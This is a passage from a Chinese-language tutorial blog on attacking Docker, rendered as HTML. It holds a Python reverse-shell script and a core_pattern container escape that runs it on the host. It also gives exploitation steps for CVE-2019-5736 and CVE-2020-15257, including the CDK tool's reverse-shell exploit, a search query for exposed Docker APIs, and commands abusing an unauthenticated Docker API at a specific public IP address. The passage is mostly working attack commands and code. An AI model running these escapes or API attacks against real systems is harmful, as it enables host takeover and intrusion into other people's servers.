+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">os</span><span class="p">.</span><span class="na">dup2</span><span class="p">(</span><span class="n">s</span><span class="p">.</span><span class="na">fileno</span><span class="p">(),</span><span class="w"> </span><span class="n">1</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">os</span><span class="p">.</span><span class="na">dup2</span><span class="p">(</span><span class="n">s</span><span class="p">.</span><span class="na">fileno</span><span class="p">(),</span><span class="w"> </span><span class="n">2</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">os</span><span class="p">.</span><span class="na">putenv</span><span class="p">(</span><span class="s">&#34;HISTFILE&#34;</span><span class="p">,</span><span class="w"> </span><span class="err">&#39;</span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="kc">null</span><span class="err">&#39;</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">pty</span><span class="p">.</span><span class="na">spawn</span><span class="p">(</span><span class="s">&#34;/bin/bash&#34;</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="err">#</span><span class="w"> </span><span class="n">os</span><span class="p">.</span><span class="na">remove</span><span class="p">(</span><span class="err">&#39;</span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="p">.</span><span class="na">t</span><span class="p">.</span><span class="na">py</span><span class="err">&#39;</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">s</span><span class="p">.</span><span class="na">close</span><span class="p">()</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">if</span><span class="w"> </span><span class="n">__name__</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="s">&#34;__main__&#34;</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">main</span><span class="p">()</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">EOF</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//或者</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">apt</span><span class="o">-</span><span class="n">get</span><span class="w"> </span><span class="n">update</span><span class="w"> </span><span class="o">-</span><span class="n">y</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">apt</span><span class="o">-</span><span class="n">get</span><span class="w"> </span><span class="n">install</span><span class="w"> </span><span class="n">vim</span><span class="w"> </span><span class="n">gcc</span><span class="w"> </span><span class="o">-</span><span class="n">y</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">vim</span><span class="w"> </span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="p">.</span><span class="na">t</span><span class="p">.</span><span class="na">py</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">chmod</span><span class="w"> </span><span class="n">777</span><span class="w"> </span><span class="p">.</span><span class="na">rce</span><span class="p">.</span><span class="na">py</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//写入反弹 shell 到目标的 proc 目录下</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">echo</span><span class="w"> </span><span class="o">-</span><span class="n">e</span><span class="w"> </span><span class="s">&#34;|/var/lib/docker/overlay2/b6dd750b0dc302208909571f9caa6be7a16129271f837db5d781f3fbabb9b9f3/merged/tmp/.rce.py \rcore    &#34;</span><span class="w"> </span><span class="o">&gt;</span><span class="w">  </span><span class="o">/</span><span class="n">host</span><span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="n">sys</span><span class="o">/</span><span class="n">kernel</span><span class="o">/</span><span class="n">core_pattern</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">cat</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">rce</span><span class="p">.</span><span class="na">c</span><span class="w"> </span><span class="o">&lt;&lt;</span><span class="w"> </span><span class="err">&#39;</span><span class="n">EOF</span><span class="err">&#39;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">#</span><span class="n">include</span><span class="o">&lt;</span><span class="n">stdio</span><span class="p">.</span><span class="na">h</span><span class="o">&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="o">*</span><span class="n">a</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">NULL</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="o">*</span><span class="n">a</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">1</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">0</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">EOF</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">gcc</span><span class="w"> </span><span class="n">rce</span><span class="p">.</span><span class="na">c</span><span class="w"> </span><span class="o">-</span><span class="n">o</span><span class="w"> </span><span class="n">rce</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">.</span><span class="o">/</span><span class="n">rce</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/docker%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/image/18.png"
+	width="1032"
+	height="661"
+	srcset="/p/docker%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/image/18_huab8b229aa767b5c53a44532e2f27a976_137565_480x0_resize_box_3.png 480w, /p/docker%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/image/18_huab8b229aa767b5c53a44532e2f27a976_137565_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="156"
+		data-flex-basis="374px"
+	
+></p>
+<p><img src="/p/docker%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/image/19.png"
+	width="936"
+	height="427"
+	srcset="/p/docker%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/image/19_hudd92637735814f534b950b318c5d53df_513944_480x0_resize_box_3.png 480w, /p/docker%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/image/19_hudd92637735814f534b950b318c5d53df_513944_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="219"
+		data-flex-basis="526px"
+	
+></p>
+<h3 id="33docker-历史版本漏洞逃逸">3.3.Docker 历史版本漏洞逃逸
+</h3><p><a class="link" href="https://www.cnblogs.com/loveqixin/p/18648231"  target="_blank" rel="noopener"
+    >https://www.cnblogs.com/loveqixin/p/18648231</a></p>
+<h4 id="331cve-2019-5736-runc逃逸鸡肋">3.3.1.CVE-2019-5736 RunC逃逸（鸡肋）
+</h4><p><strong>影响版本：Docker &lt;= 18.09.2</strong>
+<strong>RunC version &lt;= 1.0-rc6</strong></p>
+<p><strong>由于版本过老，现在</strong> <strong>Docker 官方和所有主流镜像站（包括阿里云）早已从 APT 仓库中移除了 18.06 版本。</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">apt</span><span class="o">-</span><span class="n">get</span><span class="w"> </span><span class="n">update</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">apt</span><span class="o">-</span><span class="n">get</span><span class="w"> </span><span class="n">install</span><span class="w"> </span><span class="o">-</span><span class="n">y</span><span class="w"> </span><span class="n">apt</span><span class="o">-</span><span class="n">transport</span><span class="o">-</span><span class="n">https</span><span class="w"> </span><span class="n">ca</span><span class="o">-</span><span class="n">certificates</span><span class="w"> </span><span class="n">curl</span><span class="w"> </span><span class="n">software</span><span class="o">-</span><span class="n">properties</span><span class="o">-</span><span class="n">common</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">curl</span><span class="w"> </span><span class="o">-</span><span class="n">fsSL</span><span class="w"> </span><span class="n">https</span><span class="p">:</span><span class="c1">//mirrors.aliyun.com/docker-ce/linux/ubuntu/gpg | sudo gpg --dearmor -o /usr/share/keyrings/docker-archive-keyring.gpg</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">add</span><span class="o">-</span><span class="n">apt</span><span class="o">-</span><span class="n">repository</span><span class="w"> </span><span class="s">&#34;deb [arch=amd64] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">apt</span><span class="o">-</span><span class="n">get</span><span class="w"> </span><span class="n">update</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">apt</span><span class="o">-</span><span class="n">cache</span><span class="w"> </span><span class="n">madison</span><span class="w"> </span><span class="n">docker</span><span class="o">-</span><span class="n">ce</span><span class="w">          </span><span class="c1">//列出可安装docker-ce版本</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">apt</span><span class="o">-</span><span class="n">get</span><span class="w"> </span><span class="n">install</span><span class="w"> </span><span class="n">docker</span><span class="o">-</span><span class="n">ce</span><span class="o">=</span><span class="n">18</span><span class="p">.</span><span class="na">06</span><span class="p">.</span><span class="na">1</span><span class="o">~</span><span class="n">ce</span><span class="o">~</span><span class="n">3</span><span class="o">-</span><span class="n">0</span><span class="o">~</span><span class="n">ubuntu</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">docker</span><span class="w"> </span><span class="n">version</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">docker</span><span class="o">-</span><span class="n">runc</span><span class="w"> </span><span class="o">--</span><span class="n">version</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><a class="link" href="https://github.com/Frichetten/CVE-2019-5736-PoC"  target="_blank" rel="noopener"
+    >https://github.com/Frichetten/CVE-2019-5736-PoC</a>           漏洞利用poc</p>
+<p>更改一下要执行底命令编译后上传即可</p>
+<p><img src="/p/docker%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/image/20.png"
+	width="1189"
+	height="341"
+	srcset="/p/docker%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/image/20_hu703f2620fef5e767323bef0904a1e216_35544_480x0_resize_box_3.png 480w, /p/docker%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/image/20_hu703f2620fef5e767323bef0904a1e216_35544_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="348"
+		data-flex-basis="836px"
+	
+></p>
+<p><strong>需要管理员手动进入容器才能触发</strong></p>
+<h4 id="332cve-2020-15257-containerd逃逸">3.3.2.CVE-2020-15257 containerd逃逸
+</h4><p><strong>影响版本：containerd &lt; 1.4.3 &amp; containerd &lt; 1.3.9</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">apt</span><span class="o">-</span><span class="n">get</span><span class="w"> </span><span class="n">update</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">apt</span><span class="o">-</span><span class="n">get</span><span class="w"> </span><span class="n">install</span><span class="w"> </span><span class="n">ca</span><span class="o">-</span><span class="n">certificates</span><span class="w"> </span><span class="n">curl</span><span class="w"> </span><span class="n">software</span><span class="o">-</span><span class="n">properties</span><span class="o">-</span><span class="n">common</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">curl</span><span class="w"> </span><span class="o">-</span><span class="n">fsSL</span><span class="w"> </span><span class="n">https</span><span class="p">:</span><span class="c1">//download.docker.com/linux/ubuntu/gpg | apt-key add -</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">add</span><span class="o">-</span><span class="n">apt</span><span class="o">-</span><span class="n">repository</span><span class="w"> </span><span class="s">&#34;deb [arch=amd64] https://download.docker.com/linux/ubuntu xenial stable&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">apt</span><span class="o">-</span><span class="n">get</span><span class="w"> </span><span class="n">update</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">apt</span><span class="o">-</span><span class="n">cache</span><span class="w"> </span><span class="n">madison</span><span class="w"> </span><span class="n">docker</span><span class="o">-</span><span class="n">ce</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">apt</span><span class="o">-</span><span class="n">get</span><span class="w"> </span><span class="n">install</span><span class="w"> </span><span class="n">docker</span><span class="o">-</span><span class="n">ce</span><span class="o">=</span><span class="n">5</span><span class="p">:</span><span class="n">19</span><span class="p">.</span><span class="na">03</span><span class="p">.</span><span class="na">6</span><span class="o">~</span><span class="n">3</span><span class="o">-</span><span class="n">0</span><span class="o">~</span><span class="n">ubuntu</span><span class="o">-</span><span class="n">xenial</span><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">docker</span><span class="o">-</span><span class="n">ce</span><span class="o">-</span><span class="n">cli</span><span class="o">=</span><span class="n">5</span><span class="p">:</span><span class="n">19</span><span class="p">.</span><span class="na">03</span><span class="p">.</span><span class="na">6</span><span class="o">~</span><span class="n">3</span><span class="o">-</span><span class="n">0</span><span class="o">~</span><span class="n">ubuntu</span><span class="o">-</span><span class="n">xenial</span><span class="w"> </span><span class="n">containerd</span><span class="p">.</span><span class="na">io</span><span class="o">=</span><span class="n">1</span><span class="p">.</span><span class="na">2</span><span class="p">.</span><span class="na">4</span><span class="o">-</span><span class="n">1</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">sudo</span><span class="w"> </span><span class="n">apt</span><span class="w"> </span><span class="n">install</span><span class="w"> </span><span class="o">-</span><span class="n">y</span><span class="w"> </span><span class="err">\</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="n">docker</span><span class="o">-</span><span class="n">ce</span><span class="o">=</span><span class="n">5</span><span class="p">:</span><span class="n">19</span><span class="p">.</span><span class="na">03</span><span class="p">.</span><span class="na">6</span><span class="err">～</span><span class="n">3</span><span class="o">-</span><span class="n">0</span><span class="err">～</span><span class="n">ubuntu</span><span class="o">-</span><span class="n">xenial</span><span class="w"> </span><span class="err">\</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="n">docker</span><span class="o">-</span><span class="n">ce</span><span class="o">-</span><span class="n">cli</span><span class="o">=</span><span class="n">5</span><span class="p">:</span><span class="n">19</span><span class="p">.</span><span class="na">03</span><span class="p">.</span><span class="na">6</span><span class="err">～</span><span class="n">3</span><span class="o">-</span><span class="n">0</span><span class="err">～</span><span class="n">ubuntu</span><span class="o">-</span><span class="n">xenial</span><span class="w"> </span><span class="err">\</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="n">containerd</span><span class="p">.</span><span class="na">io</span><span class="o">=</span><span class="n">1</span><span class="p">.</span><span class="na">2</span><span class="p">.</span><span class="na">4</span><span class="o">-</span><span class="n">1</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><a class="link" href="https://github.com/cdk-team/CDK/wiki/CDK-Home-CN"  target="_blank" rel="noopener"
+    >https://github.com/cdk-team/CDK/wiki/CDK-Home-CN</a></p>
+<p>将编译的CDK文件上传到docker环境中</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">chmod</span><span class="w"> </span><span class="n">777</span><span class="w"> </span><span class="n">cdk_linux_amd64</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">.</span><span class="o">/</span><span class="n">cdk_linux_amd64</span><span class="w"> </span><span class="n">evaluate</span><span class="w">       </span><span class="c1">//本机信息收集</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">cdk</span><span class="w"> </span><span class="n">run</span><span class="w"> </span><span class="o">--</span><span class="n">list</span><span class="w">                   </span><span class="c1">//列出所有EXP</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">.</span><span class="o">/</span><span class="n">cdk_linux_amd64</span><span class="w"> </span><span class="n">run</span><span class="w"> </span><span class="n">shim</span><span class="o">-</span><span class="n">pwn</span><span class="w"> </span><span class="n">reverse</span><span class="w"> </span><span class="n">xx</span><span class="p">.</span><span class="na">xx</span><span class="p">.</span><span class="na">xx</span><span class="p">.</span><span class="na">xx</span><span class="w"> </span><span class="n">xxxx</span><span class="w"> </span><span class="c1">//这是指定漏洞利用</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">.</span><span class="o">/</span><span class="n">cdk_linux_amd64</span><span class="w"> </span><span class="n">auto</span><span class="o">-</span><span class="n">escape</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="c1">//自动化漏洞扫描</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><a class="link" href="https://github.com/teamssix/container-escape-check"  target="_blank" rel="noopener"
+    >https://github.com/teamssix/container-escape-check</a>         容器逃逸检测</p>
+<h2 id="4docker常见漏洞">4.Docker常见漏洞
+</h2><p><a class="link" href="https://mp.weixin.qq.com/s/tdL2E501k2EhfJ4WurVd4Q"  target="_blank" rel="noopener"
+    >https://mp.weixin.qq.com/s/tdL2E501k2EhfJ4WurVd4Q</a></p>
+<p><a class="link" href="https://mp.weixin.qq.com/s/bzIAQK4_CuSZcfsX6r6FSg"  target="_blank" rel="noopener"
+    >https://mp.weixin.qq.com/s/bzIAQK4_CuSZcfsX6r6FSg</a></p>
+<h3 id="41docker未授权漏洞">4.1.Docker未授权漏洞
+</h3><p><a class="link" href="https://mp.weixin.qq.com/s/Smzz-1wcxG47EKiRnFWlZg"  target="_blank" rel="noopener"
+    >https://mp.weixin.qq.com/s/Smzz-1wcxG47EKiRnFWlZg</a></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">搜索语法</span><span class="err">：</span><span class="n">port</span><span class="p">:</span><span class="s">&#34;2375&#34;</span><span class="w"> </span><span class="n">AND</span><span class="w"> </span><span class="n">service</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;docker&#34;</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="411查看版本接口">4.1.1.查看版本接口
+</h4><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="nl">http</span><span class="p">:</span><span class="c1">//120.25.192.92:2375/version</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/docker%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/image/21.png"
+	width="1622"
+	height="851"
+	srcset="/p/docker%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/image/21_hu47731ee84c374a5d6e5be98de76677da_57937_480x0_resize_box_3.png 480w, /p/docker%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/image/21_hu47731ee84c374a5d6e5be98de76677da_57937_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="190"
+		data-flex-basis="457px"
+	
+></p>
+<h4 id="412查看info目录">4.1.2.查看info目录
+</h4><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="nl">http</span><span class="p">:</span><span class="c1">//120.25.192.92:2375/info</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/docker%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/image/22.png"
+	width="1586"
+	height="775"
+	srcset="/p/docker%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/image/22_huf4034b3cfba88450d3e5e9d3d877e2db_56359_480x0_resize_box_3.png 480w, /p/docker%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/image/22_huf4034b3cfba88450d3e5e9d3d877e2db_56359_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="204"
+		data-flex-basis="491px"
+	
+></p>
+<h4 id="413查看image镜像">4.1.3.查看image镜像
+</h4><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="nl">http</span><span class="p">:</span><span class="c1">//120.25.192.92:2375/images/json</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/docker%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/image/23.png"
+	width="1651"
+	height="761"
+	srcset="/p/docker%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/image/23_hu56cb804711ab894f015a89090c0cf9e9_62893_480x0_resize_box_3.png 480w, /p/docker%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/image/23_hu56cb804711ab894f015a89090c0cf9e9_62893_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="216"
+		data-flex-basis="520px"
+	
+></p>
+<h4 id="414docker连接未授权端口">4.1.4.Docker连接未授权端口
+</h4><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">docker</span><span class="w"> </span><span class="o">-</span><span class="n">H</span><span class="w"> </span><span class="n">tcp</span><span class="p">:</span><span class="c1">//120.25.192.92:2375 ps -a</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/docker%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/image/24.png"
+	width="1392"
+	height="246"
+	srcset="/p/docker%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/image/24_hu80672d35dc0b76b60caaa31ac9b89ddc_430896_480x0_resize_box_3.png 480w, /p/docker%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/image/24_hu80672d35dc0b76b60caaa31ac9b89ddc_430896_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="565"
+		data-flex-basis="1358px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">docker</span><span class="w"> </span><span class="o">-</span><span class="n">H</span><span class="w"> </span><span class="n">tcp</span><span class="p">:</span><span class="c1">//120.25.192.92:2375 images       查看镜像</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">docker</span><span class="w"> </span><span class="o">-</span><span class="n">H</span><span class="w"> </span><span class="n">tcp</span><span class="p">:</span><span class="c1">//1.1.1.1 stop d192a8dee160   #停止一个已经开启的容器</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">docker</span><span class="w"> </span><span class="o">-</span><span class="n">H</span><span class="w"> </span><span class="n">1</span><span class="p">.</span><span class="na">1</span><span class="p">.</span><span class="na">1</span><span class="p">.</span><span class="na">1</span><span class="w"> </span><span class="n">exec</span><span class="w"> </span><span class="o">-</span><span class="n">it</span><span class="w"> </span><span class="n">3d1c2eaa9df8</span><span class="w"> </span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">bash</span><span class="w">  </span><span class="err">#</span><span class="n">连接一个容器</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/docker%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/image/25.png"
+	width="1248"
+	height="292"
+	srcset="/p/docker%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/image/25_hu4313974da8c1baca2e83dfd250851c56_422437_480x0_resize_box_3.png 480w, /p/docker%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/image/25_hu4313974da8c1baca2e83dfd250851c56_422437_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="427"
+		data-flex-basis="1025px"
+	
+></p>
+<h4 id="415写公钥getshell">4.1.5.写公钥GetShell
+</h4><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">ssh</span><span class="o">-</span><span class="n">keygen</span><span class="w"> </span><span class="o">-</span><span class="n">t</span><span class="w"> </span><span class="n">rsa</span><span class="w">           </span><span class="err">#</span><span class="n">生成公钥</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/docker%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/image/26.png"
+	width="1005"
+	height="499"
+	srcset="/p/docker%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/image/26_hu1f498c25307a655b3406758fbb79d5b9_577981_480x0_resize_box_3.png 480w, /p/docker%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/image/26_hu1f498c25307a655b3406758fbb79d5b9_577981_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="201"
+		data-flex-basis="483px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">cat</span><span class="w"> </span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="p">.</span><span class="na">ssh</span><span class="o">/</span><span class="n">id_rsa</span><span class="p">.</span><span class="na">pub</span><span class="w">     </span><span class="err">#</span><span class="n">查看生成的公钥</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/docker%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/image/27.png"
+	width="1286"
+	height="131"
+	srcset="/p/docker%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/image/27_hu89751cb0605c115292ddcf9ff45ab071_236464_480x0_resize_box_3.png 480w, /p/docker%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/image/27_hu89751cb0605c115292ddcf9ff45ab071_236464_1024x0_resize_box_3.png 1024w"
